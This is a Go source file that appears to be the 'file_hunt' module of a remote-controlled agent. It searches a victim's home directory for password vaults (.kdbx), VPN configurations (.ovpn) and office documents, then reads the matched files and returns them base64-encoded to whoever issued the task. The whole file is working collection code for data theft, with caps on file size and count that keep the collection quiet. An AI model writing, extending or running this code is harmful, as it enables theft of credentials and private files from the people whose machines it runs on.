//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const (
	huntDefaultMaxFiles = 200
	huntHardMaxFiles    = 500
	huntDefaultMaxDepth = 8
	huntHardMaxDepth    = 16
	huntDefaultMaxBytes = 512 * 1024
	huntHardMaxBytes    = 2 * 1024 * 1024
	huntDefaultTotalDL  = 5 * 1024 * 1024
	huntHardTotalDL     = 8 * 1024 * 1024
	huntDefaultDLCount  = 10
)

var huntDefaultPatterns = []string{"*.docx", "*.xlsx", "*.pdf", "*.txt", "*.kdbx", "*.ovpn"}

var huntSkipDirNames = map[string]bool{
	".git": true, ".svn": true, ".hg": true, "node_modules": true,
	"windows": true, "$recycle.bin": true, "system volume information": true,
	"proc": true, "sys": true, "dev": true, "lost+found": true,
}

type huntOpts struct {
	root      string
	patterns  []string
	maxFiles  int
	maxDepth  int
	maxBytes  int64
	download  bool
	maxDL     int
	totalDL   int64
}

func handleFileHunt(task Task, res *TaskResult) {
	opts := parseHuntOpts(task.Path, task.Command, task.Data)
	out, err := runFileHunt(opts)
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}

func parseHuntOpts(path, command, data string) huntOpts {
	opts := huntOpts{
		root:     strings.TrimSpace(path),
		maxFiles: huntDefaultMaxFiles,
		maxDepth: huntDefaultMaxDepth,
		maxBytes: huntDefaultMaxBytes,
		maxDL:    huntDefaultDLCount,
		totalDL:  huntDefaultTotalDL,
	}
	cmd := strings.TrimSpace(command)
	if cmd == "" {
		opts.patterns = append([]string{}, huntDefaultPatterns...)
	} else {
		for _, p := range strings.Split(cmd, ",") {
			p = strings.TrimSpace(p)
			if p != "" {
				opts.patterns = append(opts.patterns, p)
			}
		}
	}
	if opts.root == "" {
		opts.root = huntDefaultRoot()
	}
	for _, part := range strings.Split(data, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		kv := strings.SplitN(part, "=", 2)
		if len(kv) != 2 {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(kv[0]))
		val := strings.TrimSpace(kv[1])
		switch key {
		case "max_files":
			if n, err := strconv.Atoi(val); err == nil && n > 0 {
				opts.maxFiles = n
			}
		case "max_depth":
			if n, err := strconv.Atoi(val); err == nil && n > 0 {
				opts.maxDepth = n
			}
		case "max_bytes":
			if n, err := strconv.ParseInt(val, 10, 64); err == nil && n > 0 {
				opts.maxBytes = n
			}
		case "download":
			opts.download = val == "1" || strings.EqualFold(val, "true") || val == "yes"
		case "max_download":
			if n, err := strconv.Atoi(val); err == nil && n > 0 {
				opts.maxDL = n
			}
		case "total_bytes":
			if n, err := strconv.ParseInt(val, 10, 64); err == nil && n > 0 {
				opts.totalDL = n
			}
		}
	}
	if opts.maxFiles > huntHardMaxFiles {
		opts.maxFiles = huntHardMaxFiles
	}
	if opts.maxDepth > huntHardMaxDepth {
		opts.maxDepth = huntHardMaxDepth
	}
	if opts.maxBytes > huntHardMaxBytes {
		opts.maxBytes = huntHardMaxBytes
	}
	if opts.totalDL > huntHardTotalDL {
		opts.totalDL = huntHardTotalDL
	}
	if opts.maxDL > huntDefaultDLCount {
		opts.maxDL = huntDefaultDLCount
	}
	return opts
}

func huntDefaultRoot() string {
	if runtime.GOOS == "windows" {
		if v := os.Getenv("USERPROFILE"); v != "" {
			return v
		}
		return "."
	}
	if v := os.Getenv("HOME"); v != "" {
		return v
	}
	return "."
}

func matchHuntName(name string, patterns []string) bool {
	if len(patterns) == 0 {
		return true
	}
	base := filepath.Base(name)
	lower := strings.ToLower(base)
	for _, p := range patterns {
		p = strings.TrimSpace(p)
		if p == "" || p == "*" {
			return true
		}
		if ok, _ := filepath.Match(p, base); ok {
			return true
		}
		if ok, _ := filepath.Match(strings.ToLower(p), lower); ok {
			return true
		}
		if !strings.ContainsAny(p, "*?[") && strings.Contains(lower, strings.ToLower(p)) {
			return true
		}
	}
	return false
}

func skipHuntDir(name string) bool {
	return huntSkipDirNames[strings.ToLower(name)]
}

func huntDepth(root, p string) int {
	rel, err := filepath.Rel(root, p)
	if err != nil {
		return 0
	}
	if rel == "." {
		return 0
	}
	return strings.Count(rel, string(os.PathSeparator)) + 1
}

func runFileHunt(opts huntOpts) (string, error) {
	root := opts.root
	info, err := os.Stat(root)
	if err != nil {
		return "", fmt.Errorf("file_hunt: %w", err)
	}
	if !info.IsDir() {
		root = filepath.Dir(root)
	}

	var sb strings.Builder
	fmt.Fprintf(&sb, "# file_hunt root=%s patterns=%s max_files=%d max_depth=%d download=%v max_bytes=%d\n",
		root, strings.Join(opts.patterns, ","), opts.maxFiles, opts.maxDepth, opts.download, opts.maxBytes)
	sb.WriteString("path\tsize\tmtime\tstatus\n")

	type hit struct {
		path string
		size int64
		mod  time.Time
	}
	var hits []hit
	truncated := false
	walkErr := filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err := currentExecCtx().Err(); err != nil {
			return err
		}
		if err != nil {
			return nil
		}
		if d.IsDir() {
			if p != root && skipHuntDir(d.Name()) {
				return filepath.SkipDir
			}
			if huntDepth(root, p) > opts.maxDepth {
				return filepath.SkipDir
			}
			return nil
		}
		if !matchHuntName(d.Name(), opts.patterns) {
			return nil
		}
		fi, err := d.Info()
		if err != nil {
			return nil
		}
		if len(hits) >= opts.maxFiles {
			truncated = true
			return fs.SkipAll
		}
		hits = append(hits, hit{path: p, size: fi.Size(), mod: fi.ModTime()})
		return nil
	})
	if walkErr != nil && walkErr != fs.SkipAll {
		if currentExecCtx().Err() != nil {
			fmt.Fprintf(&sb, "# walk cancelled: %v\n", walkErr)
		} else {
			fmt.Fprintf(&sb, "# walk error: %v\n", walkErr)
		}
	}

	var downloaded int
	var downloadedBytes int64
	var blobs strings.Builder
	for _, h := range hits {
		status := "listed"
		if opts.download && downloaded < opts.maxDL && h.size > 0 && h.size <= opts.maxBytes && downloadedBytes+h.size <= opts.totalDL {
			data, err := readHuntFile(h.path, opts.maxBytes)
			if err == nil {
				status = "downloaded"
				downloaded++
				downloadedBytes += int64(len(data))
				fmt.Fprintf(&blobs, "=== file path=%s size=%d ===\n%s\n=== end ===\n",
					h.path, len(data), base64.StdEncoding.EncodeToString(data))
			} else {
				status = "read_error"
			}
		} else if opts.download && h.size > opts.maxBytes {
			status = "skipped_size"
		}
		fmt.Fprintf(&sb, "%s\t%d\t%s\t%s\n", h.path, h.size, h.mod.Format("2006-01-02 15:04"), status)
	}
	fmt.Fprintf(&sb, "# matched=%d truncated=%v downloaded=%d downloaded_bytes=%d\n",
		len(hits), truncated, downloaded, downloadedBytes)
	if blobs.Len() > 0 {
		sb.WriteString("=== downloaded ===\n")
		sb.WriteString(blobs.String())
	}
	return sb.String(), nil
}

func readHuntFile(path string, capBytes int64) ([]byte, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	return io.ReadAll(io.LimitReader(f, capBytes+1))
}
